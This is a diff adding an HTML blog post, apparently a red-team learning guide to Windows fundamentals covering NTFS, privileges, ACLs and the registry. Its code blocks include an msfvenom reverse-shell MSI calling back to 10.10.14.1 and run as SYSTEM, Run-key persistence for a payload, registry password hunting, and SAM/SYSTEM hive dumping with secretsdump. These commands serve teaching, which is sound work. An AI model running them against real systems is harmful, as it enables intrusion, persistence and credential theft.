@@ -1,0 +1,2754 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="robots" content="noindex, nofollow">
+  <meta name="view-transition" content="same-origin">
+  <title>Windows Fundamentals — The Complete Foundation — Axiom</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <script src="/axiom-blog-site/static/js/theme.js?v=1"></script>
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500&display=swap">
+  <link rel="stylesheet" href="/axiom-blog-site/static/css/style.css?v=37">
+  <link rel="stylesheet" href="/axiom-blog-site/cats.css">
+  <link rel="stylesheet" href="/axiom-blog-site/static/css/hljs.min.css?v=2">
+  <link rel="alternate" type="application/atom+xml" title="Axiom" href="/axiom-blog-site/feed.xml">
+  
+  
+  <script type="application/json" id="crypto-config">{"iterations": 200000, "salt": "Hs5vGSmGG9SrSvdivb1KMQ==", "validator": {"ciphertext": "qc5l/aTsWWRNo4f5E4/mEvP5on0aI+iozmsqvajrAwNS", "iv": "HdtYEOAFH1dyaFcb"}}</script>
+
+</head>
+<body class="cat-context-learn">
+  <header class="site-header">
+    <div class="container">
+      <a href="/axiom-blog-site/" class="site-brand">
+        <span class="brand-name">Axiom</span>
+      </a>
+      <nav class="site-nav">
+        
+  <a href="/axiom-blog-site/" class="nav-back">
+    <svg width="14" height="14" viewBox="0 0 16 16" fill="currentColor">
+      <path fill-rule="evenodd" d="M15 8a.5.5 0 0 0-.5-.5H2.707l3.147-3.146a.5.5 0 1 0-.708-.708l-4 4a.5.5 0 0 0 0 .708l4 4a.5.5 0 0 0 .708-.708L2.707 8.5H14.5A.5.5 0 0 0 15 8z"/>
+    </svg>
+    All posts
+  </a>
+
+        <button class="search-trigger" id="themeToggle" aria-label="Toggle theme" title="Toggle theme">
+          <svg class="icon-sun" width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <circle cx="12" cy="12" r="4"/>
+            <path d="M12 2v2M12 20v2M4.93 4.93l1.41 1.41M17.66 17.66l1.41 1.41M2 12h2M20 12h2M6.34 17.66l-1.41 1.41M19.07 4.93l-1.41 1.41"/>
+          </svg>
+          <svg class="icon-moon" width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/>
+          </svg>
+        </button>
+        <button class="search-trigger" id="searchTrigger" aria-label="Search posts" title="Search">
+          <svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/>
+          </svg>
+        </button>
+      </nav>
+    </div>
+  </header>
+
+  
+  <div class="search-overlay" id="searchOverlay" aria-hidden="true" role="dialog" aria-modal="true" aria-label="Search">
+    <div class="search-backdrop" id="searchBackdrop"></div>
+    <div class="search-panel">
+      <div class="search-input-wrap">
+        <svg class="search-icon-inner" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/>
+        </svg>
+        <input class="search-input" id="searchInput"
+               type="search"
+               placeholder="Search titles, tags, content…"
+               autocomplete="off"
+               spellcheck="false"
+               maxlength="100"
+               aria-label="Search posts">
+        <button class="search-close" id="searchClose" aria-label="Close search">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round">
+            <path d="M18 6 6 18M6 6l12 12"/>
+          </svg>
+        </button>
+      </div>
+      <div class="search-results" id="searchResults" role="listbox" aria-live="polite"></div>
+    </div>
+  </div>
+
+  
+  <div class="modal-backdrop" id="shortcutsModalBackdrop" hidden>
+    <div class="modal" id="shortcutsModal" role="dialog" aria-modal="true" aria-labelledby="shortcutsTitle">
+      <div class="modal-header">
+        <div class="modal-icon">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
+            <rect x="2" y="6" width="20" height="12" rx="2"/>
+            <path d="M6 10h.01M10 10h.01M14 10h.01M18 10h.01M6 14h12"/>
+          </svg>
+        </div>
+        <div>
+          <h2 class="modal-title" id="shortcutsTitle">Keyboard Shortcuts</h2>
+          <p class="modal-subtitle">Navigate this site faster.</p>
+        </div>
+      </div>
+      <div class="modal-body">
+        <div class="shortcuts-list">
+          <div class="shortcuts-row">
+            <span>Open search</span>
+            <span class="shortcuts-keys"><span class="key">/</span><span class="key">s</span></span>
+          </div>
+          <div class="shortcuts-row">
+            <span>Close dialog</span>
+            <span class="shortcuts-keys"><span class="key">Esc</span></span>
+          </div>
+          <div class="shortcuts-row">
+            <span>Go home</span>
+            <span class="shortcuts-keys"><span class="key">g</span><span class="key">h</span></span>
+          </div>
+          <div class="shortcuts-row">
+            <span>Show this help</span>
+            <span class="shortcuts-keys"><span class="key">?</span></span>
+          </div>
+        </div>
+      </div>
+      <div class="modal-footer">
+        <button class="btn btn-ghost" id="shortcutsClose">Close</button>
+      </div>
+    </div>
+  </div>
+
+  <main class="site-main">
+    <div class="container">
+      
+
+<div id="readingProgress" hidden></div>
+
+<article class="post-article has-toc cat-context-learn">
+
+  <div class="post-main">
+
+  <header class="post-header">
+    <h1 class="post-title">Windows Fundamentals — The Complete Foundation</h1>
+    <div class="post-meta">
+      <time>2026-06-04</time>
+      
+        <span class="meta-sep">·</span>
+        <span class="reading-time">9 min read</span>
+      
+      
+        <span class="meta-sep">·</span>
+        <a href="/axiom-blog-site/cat/learn/" class="cat-badge cat-badge-link cat-learn">Learn</a>
+      
+      
+        <span class="meta-sep">·</span>
+        <span class="tag-list">
+          
+            <span class="tag">windows</span>
+          
+            <span class="tag">fundamentals</span>
+          
+            <span class="tag">powershell</span>
+          
+            <span class="tag">active-directory</span>
+          
+            <span class="tag">red-team</span>
+          
+            <span class="tag">privesc</span>
+          
+        </span>
+      
+    </div>
+    
+      <p class="post-summary">Architecture, filesystem, registry, users, NTFS permissions, processes, services, PowerShell, Active Directory, event logs, and a red team lens on every layer.</p>
+    
+  </header>
+
+  
+  
+
+
+  <div class="post-body">
+    
+
+      
+        <div class="block text-block"><p>Windows dominates enterprise environments. Most corporate targets you will encounter run Windows — workstations, servers, domain controllers. Understanding how Windows works at a deep level is not optional for anyone doing offensive security, incident response, or system administration.</p>
+<p>This guide covers the OS from the ground up: the filesystem, identity model, registry, processes, services, PowerShell, and Active Directory. Red team perspectives are embedded throughout every section — because understanding how things get abused is the fastest way to understand why they're designed the way they are.</p></div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-2">
+          <h2 class="section-heading">
+            <span class="heading-index">01</span>
+            <span class="heading-text">Windows Architecture Overview</span>
+          </h2>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>Windows splits execution into two privilege levels:</p>
+<ul>
+<li><strong>User mode</strong> — applications, services, subsystems. Restricted hardware access. Crashes here affect only the process.</li>
+<li><strong>Kernel mode</strong> — the Windows kernel (<code>ntoskrnl.exe</code>), hardware abstraction layer (<code>hal.dll</code>), drivers. Full hardware access. Crashes here are BSODs.</li>
+</ul></div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">text</span>
+            
+          </div>
+          <pre><code class="language-text">┌─────────────────────────────────────────────────┐
+│  USER MODE                                       │
+│  Win32 Apps   .NET Apps   Services   Win32 API  │
+│       ↕            ↕          ↕         ↕       │
+│  ntdll.dll  (syscall boundary)                  │
+├─────────────────────────────────────────────────┤
+│  KERNEL MODE                                     │
+│  Windows Kernel (ntoskrnl.exe)                  │
+│  HAL · Drivers · Win32k.sys (GUI)               │
+└─────────────────────────────────────────────────┘</code></pre>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p><strong>Key system processes</strong> (always running, always in Task Manager):</p></div>
+
+      
+    
+
+      
+        <div class="block table-wrap">
+          <table class="table-block">
+            <thead>
+              <tr>
+                <th>Process</th><th>PID</th><th>Purpose</th><th>Red team note</th>
+              </tr>
+            </thead>
+            <tbody>
+              
+                <tr>
+                  <td>`System`</td><td>4</td><td>Kernel threads</td><td>Parent of smss.exe</td>
+                </tr>
+              
+                <tr>
+                  <td>`smss.exe`</td><td>—</td><td>Session Manager</td><td>First user-mode process</td>
+                </tr>
+              
+                <tr>
+                  <td>`csrss.exe`</td><td>—</td><td>Client/Server Runtime</td><td>Win32 subsystem</td>
+                </tr>
+              
+                <tr>
+                  <td>`wininit.exe`</td><td>—</td><td>Windows Init</td><td>Starts services.exe, lsass.exe</td>
+                </tr>
+              
+                <tr>
+                  <td>`lsass.exe`</td><td>—</td><td>Local Security Auth</td><td>**Stores credentials in memory**</td>
+                </tr>
+              
+                <tr>
+                  <td>`services.exe`</td><td>—</td><td>Service Control Manager</td><td>Parent of all services</td>
+                </tr>
+              
+                <tr>
+                  <td>`svchost.exe`</td><td>many</td><td>Service host</td><td>Many services share one host process</td>
+                </tr>
+              
+                <tr>
+                  <td>`explorer.exe`</td><td>—</td><td>Shell / desktop</td><td>Spawns user processes</td>
+                </tr>
+              
+                <tr>
+                  <td>`winlogon.exe`</td><td>—</td><td>Logon/Logoff</td><td>Handles Ctrl+Alt+Del</td>
+                </tr>
+              
+            </tbody>
+          </table>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p><strong><code>lsass.exe</code></strong> is the highest-value target in memory. It holds NTLM hashes, Kerberos tickets, and plaintext credentials (on older configs). Mimikatz dumps from lsass are the backbone of credential-based lateral movement.</p></div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-2">
+          <h2 class="section-heading">
+            <span class="heading-index">02</span>
+            <span class="heading-text">The Filesystem</span>
+          </h2>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>Windows uses <strong>NTFS</strong> (New Technology File System) as its primary filesystem. Unlike Linux's single tree, Windows uses drive letters — <code>C:\</code>, <code>D:\</code>, etc.</p></div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-3">
+          <h3 class="section-heading">
+            
+            <span class="heading-text">Key Directories</span>
+          </h3>
+        </div>
+
+      
+    
+
+      
+        <div class="block table-wrap">
+          <table class="table-block">
+            <thead>
+              <tr>
+                <th>Path</th><th>Purpose</th><th>Red team relevance</th>
+              </tr>
+            </thead>
+            <tbody>
+              
+                <tr>
+                  <td>`C:\`</td><td>Root of the system drive</td><td></td>
+                </tr>
+              
+                <tr>
+                  <td>`C:\Windows\`</td><td>OS files</td><td>`System32`, `SysWOW64`</td>
+                </tr>
+              
+                <tr>
+                  <td>`C:\Windows\System32\`</td><td>Core system DLLs and executables</td><td>DLL hijack target</td>
+                </tr>
+              
+                <tr>
+                  <td>`C:\Windows\SysWOW64\`</td><td>32-bit binaries on 64-bit Windows</td><td></td>
+                </tr>
+              
+                <tr>
+                  <td>`C:\Windows\Temp\`</td><td>System temp — writable</td><td>Drop payloads</td>
+                </tr>
+              
+                <tr>
+                  <td>`C:\Users\`</td><td>All user profiles</td><td>Credentials, tokens, history</td>
+                </tr>
+              
+                <tr>
+                  <td>`C:\Users\&lt;user&gt;\Desktop\`</td><td>User&#39;s desktop</td><td>Flag files</td>
+                </tr>
+              
+                <tr>
+                  <td>`C:\Users\&lt;user&gt;\Documents\`</td><td>Documents</td><td></td>
+                </tr>
+              
+                <tr>
+                  <td>`C:\Users\&lt;user&gt;\AppData\`</td><td>Application data (hidden)</td><td>Browser creds, app configs</td>
+                </tr>
+              
+                <tr>
+                  <td>`C:\Users\&lt;user&gt;\AppData\Roaming\`</td><td>Roaming profile data</td><td>SSH keys, putty sessions, creds</td>
+                </tr>
+              
+                <tr>
+                  <td>`C:\Users\&lt;user&gt;\AppData\Local\`</td><td>Machine-local app data</td><td>Chrome logins, tokens</td>
+                </tr>
+              
+                <tr>
+                  <td>`C:\ProgramData\`</td><td>All-user application data (hidden)</td><td>Service configs, creds</td>
+                </tr>
+              
+                <tr>
+                  <td>`C:\Program Files\`</td><td>64-bit installed applications</td><td></td>
+                </tr>
+              
+                <tr>
+                  <td>`C:\Program Files (x86)\`</td><td>32-bit applications</td><td></td>
+                </tr>
+              
+                <tr>
+                  <td>`C:\inetpub\wwwroot\`</td><td>Default IIS web root</td><td>Web shells</td>
+                </tr>
+              
+                <tr>
+                  <td>`C:\Windows\NTDS\`</td><td>Active Directory database (DC only)</td><td>`ntds.dit` = all domain hashes</td>
+                </tr>
+              
+            </tbody>
+          </table>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-3">
+          <h3 class="section-heading">
+            
+            <span class="heading-text">Alternate Data Streams (ADS)</span>
+          </h3>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>NTFS supports multiple data streams per file. The main content is the <code>$DATA</code> stream. Additional streams are hidden by default — <code>dir</code> doesn't show them.</p></div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">powershell</span>
+            
+          </div>
+          <pre><code class="language-powershell"># Write to an alternate stream
+echo &#34;hidden payload&#34; &gt; file.txt:hidden
+# Read it back
+more &lt; file.txt:hidden
+# Discover ADS
+dir /r
+gci -recurse | % { gi $_.FullName -stream * } | where stream -ne &#39;:$Data&#39;</code></pre>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>Malware hides payloads and config in ADS. Tools like <code>streams.exe</code> (Sysinternals) or PowerShell can enumerate them.</p></div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-2">
+          <h2 class="section-heading">
+            <span class="heading-index">03</span>
+            <span class="heading-text">Users, Groups &amp; Privileges</span>
+          </h2>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-3">
+          <h3 class="section-heading">
+            
+            <span class="heading-text">Local Accounts</span>
+          </h3>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>Every Windows machine has a local SAM (Security Account Manager) database stored at <code>C:\Windows\System32\config\SAM</code>. It stores local user accounts and their NTLM password hashes. The SAM is locked by the OS while Windows runs — you need <code>SYSTEM</code> privileges or a volume shadow copy to extract it.</p>
+<p><strong>Built-in local accounts:</strong></p></div>
+
+      
+    
+
+      
+        <div class="block table-wrap">
+          <table class="table-block">
+            <thead>
+              <tr>
+                <th>Account</th><th>Purpose</th><th>Notes</th>
+              </tr>
+            </thead>
+            <tbody>
+              
+                <tr>
+                  <td>`Administrator`</td><td>Full local admin</td><td>Disabled by default in modern Windows</td>
+                </tr>
+              
+                <tr>
+                  <td>`Guest`</td><td>Limited access</td><td>Disabled by default</td>
+                </tr>
+              
+                <tr>
+                  <td>`DefaultAccount`</td><td>System-managed</td><td></td>
+                </tr>
+              
+                <tr>
+                  <td>`WDAGUtilityAccount`</td><td>Windows Defender App Guard</td><td></td>
+                </tr>
+              
+            </tbody>
+          </table>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-3">
+          <h3 class="section-heading">
+            
+            <span class="heading-text">Built-in Groups</span>
+          </h3>
+        </div>
+
+      
+    
+
+      
+        <div class="block table-wrap">
+          <table class="table-block">
+            <thead>
+              <tr>
+                <th>Group</th><th>Privilege level</th><th>Red team relevance</th>
+              </tr>
+            </thead>
+            <tbody>
+              
+                <tr>
+                  <td>`Administrators`</td><td>Full local admin</td><td>Target for lateral movement</td>
+                </tr>
+              
+                <tr>
+                  <td>`Remote Desktop Users`</td><td>RDP access</td><td>Lateral movement</td>
+                </tr>
+              
+                <tr>
+                  <td>`Remote Management Users`</td><td>WinRM/PSRemoting access</td><td>Lateral movement</td>
+                </tr>
+              
+                <tr>
+                  <td>`Backup Operators`</td><td>Read any file for backup</td><td>Can read SAM/NTDS</td>
+                </tr>
+              
+                <tr>
+                  <td>`Event Log Readers`</td><td>Read event logs</td><td>Recon without admin</td>
+                </tr>
+              
+                <tr>
+                  <td>`DnsAdmins`</td><td>DNS management (domain)</td><td>DLL injection via DNS</td>
+                </tr>
+              
+                <tr>
+                  <td>`Server Operators`</td><td>Manage services</td><td>Can modify service binaries</td>
+                </tr>
+              
+            </tbody>
+          </table>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-3">
+          <h3 class="section-heading">
+            
+            <span class="heading-text">Windows Privileges (Tokens)</span>
+          </h3>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>Every process runs with an <strong>access token</strong> that contains the user's SID, group SIDs, and a list of <strong>privileges</strong>. Privileges are capabilities beyond normal file permissions — they apply system-wide.</p>
+<p><strong>High-value privileges for privilege escalation:</strong></p></div>
+
+      
+    
+
+      
+        <div class="block table-wrap">
+          <table class="table-block">
+            <thead>
+              <tr>
+                <th>Privilege</th><th>Abuse potential</th>
+              </tr>
+            </thead>
+            <tbody>
+              
+                <tr>
+                  <td>`SeImpersonatePrivilege`</td><td>Potato attacks (JuicyPotato, RoguePotato, PrintSpoofer) → SYSTEM</td>
+                </tr>
+              
+                <tr>
+                  <td>`SeAssignPrimaryTokenPrivilege`</td><td>Same as above</td>
+                </tr>
+              
+                <tr>
+                  <td>`SeBackupPrivilege`</td><td>Read any file — dump SAM, NTDS</td>
+                </tr>
+              
+                <tr>
+                  <td>`SeRestorePrivilege`</td><td>Write any file — overwrite binaries</td>
+                </tr>
+              
+                <tr>
+                  <td>`SeDebugPrivilege`</td><td>Attach to any process — dump lsass</td>
+                </tr>
+              
+                <tr>
+                  <td>`SeTakeOwnershipPrivilege`</td><td>Take ownership of any object</td>
+                </tr>
+              
+                <tr>
+                  <td>`SeLoadDriverPrivilege`</td><td>Load arbitrary kernel drivers</td>
+                </tr>
+              
+                <tr>
+                  <td>`SeCreateSymbolicLinkPrivilege`</td><td>Symlink attacks</td>
+                </tr>
+              
+            </tbody>
+          </table>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p><code>SeImpersonatePrivilege</code> is the most common: IIS app pools, SQL Server service accounts, and many service accounts have it by default. If you get code execution as one of these, you get SYSTEM.</p></div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">powershell</span>
+            <span class="code-caption">User and privilege enumeration</span>
+          </div>
+          <pre><code class="language-powershell"># Current user and privileges
+whoami
+whoami /all          # user, groups, AND privileges
+whoami /priv         # just privileges
+whoami /groups       # just groups
+
+# Local users and groups
+net user
+net user Administrator
+net localgroup
+net localgroup Administrators
+
+# PowerShell equivalents
+Get-LocalUser
+Get-LocalGroup
+Get-LocalGroupMember Administrators
+
+# All user profiles on the machine
+Get-ChildItem C:\Users
+Get-ChildItem C:\Users -Force   # show hidden
+
+# Check for admin rights
+([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+
+# CMD equivalents
+net user
+net localgroup administrators
+query user           # logged-on users
+
+# Token / privilege info
+[System.Security.Principal.WindowsIdentity]::GetCurrent()
+
+# Who else is logged in?
+query session
+query user</code></pre>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-2">
+          <h2 class="section-heading">
+            <span class="heading-index">04</span>
+            <span class="heading-text">NTFS Permissions &amp; ACLs</span>
+          </h2>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>NTFS uses <strong>Access Control Lists (ACLs)</strong> — far more granular than Linux's rwx model. Every file and folder has a <strong>DACL</strong> (Discretionary ACL) containing <strong>ACEs</strong> (Access Control Entries), each granting or denying specific rights to a specific principal (user or group).</p>
+<p><strong>NTFS permission types:</strong></p></div>
+
+      
+    
+
+      
+        <div class="block table-wrap">
+          <table class="table-block">
+            <thead>
+              <tr>
+                <th>Permission</th><th>Meaning</th>
+              </tr>
+            </thead>
+            <tbody>
+              
+                <tr>
+                  <td>Full Control</td><td>Read, write, modify, delete, change permissions, take ownership</td>
+                </tr>
+              
+                <tr>
+                  <td>Modify</td><td>Read, write, execute, delete — not change permissions</td>
+                </tr>
+              
+                <tr>
+                  <td>Read &amp; Execute</td><td>Read and run files</td>
+                </tr>
+              
+                <tr>
+                  <td>List Folder Contents</td><td>Directory listing</td>
+                </tr>
+              
+                <tr>
+                  <td>Read</td><td>Read file/folder</td>
+                </tr>
+              
+                <tr>
+                  <td>Write</td><td>Create files, write data</td>
+                </tr>
+              
+            </tbody>
+          </table>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p><strong>Permission inheritance</strong> — child objects inherit permissions from parent by default. Explicit ACEs override inherited ones.</p></div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-3">
+          <h3 class="section-heading">
+            
+            <span class="heading-text">Why This Matters for Attackers</span>
+          </h3>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>Weakly configured ACLs are among the most common Windows privilege escalation vectors:</p>
+<ul>
+<li><strong>Writable service binary</strong> — if a service executable is writable by your user, replace it with a payload</li>
+<li><strong>Writable service binary directory</strong> — DLL hijacking: drop a malicious DLL that the service loads</li>
+<li><strong>Writable registry service key</strong> — modify <code>ImagePath</code> to point to your payload</li>
+<li><strong>GenericWrite/GenericAll on AD objects</strong> — in Active Directory, ACL misconfigurations let you reset passwords, add group members, or perform targeted Kerberoasting</li>
+</ul></div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">powershell</span>
+            <span class="code-caption">ACL enumeration and weak permission hunting</span>
+          </div>
+          <pre><code class="language-powershell"># View ACL on a file or folder
+Get-Acl C:\Windows\System32
+Get-Acl C:\ProgramData\MyApp | Format-List
+(Get-Acl C:\temp\file.txt).Access
+
+# CMD
+icacls C:\Windows\System32
+icacls C:\Program Files\VulnerableApp
+
+# Find writable directories in Program Files (privesc check)
+Get-ChildItem &#34;C:\Program Files&#34; -Recurse -ErrorAction SilentlyContinue | 
+  ForEach-Object { 
+    $acl = Get-Acl $_.FullName -ErrorAction SilentlyContinue
+    $acl.Access | Where-Object { 
+      $_.IdentityReference -match &#39;Everyone|BUILTIN\\Users|Authenticated Users&#39; -and
+      $_.FileSystemRights -match &#39;Write|FullControl|Modify&#39;
+    } | ForEach-Object { $_.IdentityReference.Value + &#34; -&gt; &#34; + $_.FileSystemRights + &#34; on &#34; + $_.Path }
+  }
+
+# Check service binary permissions
+Get-WmiObject Win32_Service | Select-Object Name, PathName, StartName | 
+  Where-Object { $_.PathName -ne $null } | ForEach-Object {
+    $path = $_.PathName -replace &#39;&#34;&#39;,&#39;&#39;
+    $path = ($path -split &#39; &#39;)[0]
+    if (Test-Path $path) {
+      $acl = Get-Acl $path -ErrorAction SilentlyContinue
+      $acl.Access | Where-Object {
+        $_.FileSystemRights -match &#39;Write|FullControl&#39; -and
+        $_.IdentityReference -notmatch &#39;SYSTEM|Administrators|TrustedInstaller&#39;
+      } | ForEach-Object { &#34;WRITABLE SERVICE: $path&#34; }
+    }
+  }
+
+# PowerSploit / PowerUp — automated privesc check
+. .\PowerUp.ps1
+Invoke-AllChecks</code></pre>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-2">
+          <h2 class="section-heading">
+            <span class="heading-index">05</span>
+            <span class="heading-text">The Windows Registry</span>
+          </h2>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>The <strong>Registry</strong> is a hierarchical database that stores OS and application configuration. It's central to how Windows boots, how services start, and how applications behave — and it's riddled with persistence and privilege escalation opportunities.</p></div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-3">
+          <h3 class="section-heading">
+            
+            <span class="heading-text">Registry Hive Structure</span>
+          </h3>
+        </div>
+
+      
+    
+
+      
+        <div class="block table-wrap">
+          <table class="table-block">
+            <thead>
+              <tr>
+                <th>Hive</th><th>Abbreviation</th><th>Contents</th>
+              </tr>
+            </thead>
+            <tbody>
+              
+                <tr>
+                  <td>`HKEY_LOCAL_MACHINE`</td><td>`HKLM`</td><td>System-wide config — hardware, services, software</td>
+                </tr>
+              
+                <tr>
+                  <td>`HKEY_CURRENT_USER`</td><td>`HKCU`</td><td>Currently logged-in user&#39;s settings</td>
+                </tr>
+              
+                <tr>
+                  <td>`HKEY_USERS`</td><td>`HKU`</td><td>All user profiles (includes HKCU)</td>
+                </tr>
+              
+                <tr>
+                  <td>`HKEY_CLASSES_ROOT`</td><td>`HKCR`</td><td>File associations, COM objects</td>
+                </tr>
+              
+                <tr>
+                  <td>`HKEY_CURRENT_CONFIG`</td><td>`HKCC`</td><td>Hardware profile in use</td>
+                </tr>
+              
+            </tbody>
+          </table>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-3">
+          <h3 class="section-heading">
+            
+            <span class="heading-text">Critical Registry Keys</span>
+          </h3>
+        </div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">text</span>
+            
+          </div>
+          <pre><code class="language-text"># Service configuration — where services are defined
+HKLM\SYSTEM\CurrentControlSet\Services\&lt;ServiceName&gt;
+  ImagePath   = path to executable
+  ObjectName  = account it runs as
+
+# Autorun — executes on every user login
+HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
+
+# Installed software
+HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall
+
+# Password policy
+HKLM\SYSTEM\CurrentControlSet\Control\Lsa
+
+# LSA secrets / cached credentials
+HKLM\SECURITY\Cache             (requires SYSTEM)
+HKLM\SECURITY\Policy\Secrets    (requires SYSTEM)
+
+# AlwaysInstallElevated — if both are 1, MSI files run as SYSTEM
+HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
+HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
+
+# UAC settings
+HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
+  EnableLUA       = 1 (UAC on)
+  ConsentPromptBehaviorAdmin</code></pre>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p><strong>Registry hive files on disk</strong> (locked while Windows runs — read via VSS or offline):<br>
+- <code>C:\Windows\System32\config\SAM</code> — local account hashes<br>
+- <code>C:\Windows\System32\config\SYSTEM</code> — boot key (needed to decrypt SAM)<br>
+- <code>C:\Windows\System32\config\SECURITY</code> — LSA secrets<br>
+- <code>C:\Windows\System32\config\SOFTWARE</code> — software config</p></div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">powershell</span>
+            <span class="code-caption">Registry — reading, writing, and attacking</span>
+          </div>
+          <pre><code class="language-powershell"># Read a registry value
+Get-ItemProperty &#34;HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion&#34; -Name ProductName
+Get-ItemProperty &#34;HKLM:\SYSTEM\CurrentControlSet\Services\wuauserv&#34; | Select ImagePath
+
+# CMD equivalent
+reg query &#34;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion&#34; /v ProductName
+reg query HKLM\SYSTEM\CurrentControlSet\Services\wuauserv
+
+# Autorun entries — persistence hunting
+Get-ItemProperty &#34;HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run&#34;
+Get-ItemProperty &#34;HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run&#34;
+reg query &#34;HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run&#34;
+reg query &#34;HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run&#34;
+
+# Check AlwaysInstallElevated (privesc)
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+# If both return 1:
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f msi &gt; shell.msi
+msiexec /quiet /qn /i C:\temp\shell.msi   # runs as SYSTEM
+
+# Set a registry value
+Set-ItemProperty &#34;HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run&#34; -Name Persist -Value &#34;C:\temp\payload.exe&#34;
+reg add &#34;HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run&#34; /v Persist /t REG_SZ /d &#34;C:\temp\payload.exe&#34; /f
+
+# Find plaintext passwords stored in registry (common sysadmin laziness)
+reg query HKLM /f password /t REG_SZ /s
+reg query HKCU /f password /t REG_SZ /s
+reg query &#34;HKLM\SOFTWARE\ORL\WinVNC3\Password&#34;
+reg query &#34;HKCU\SOFTWARE\SimonTatham\PuTTY\Sessions&#34; /s  # saved PuTTY sessions (creds)
+
+# Dump SAM/SYSTEM offline for hash extraction
+reg save HKLM\SAM C:\temp\sam.hive
+reg save HKLM\SYSTEM C:\temp\system.hive
+# Then on Kali:
+impacket-secretsdump -sam sam.hive -system system.hive LOCAL</code></pre>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-2">
+          <h2 class="section-heading">
+            <span class="heading-index">06</span>
+            <span class="heading-text">Processes &amp; Services</span>
+          </h2>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-3">
+          <h3 class="section-heading">
+            
+            <span class="heading-text">Processes</span>
+          </h3>
+        </div>
+
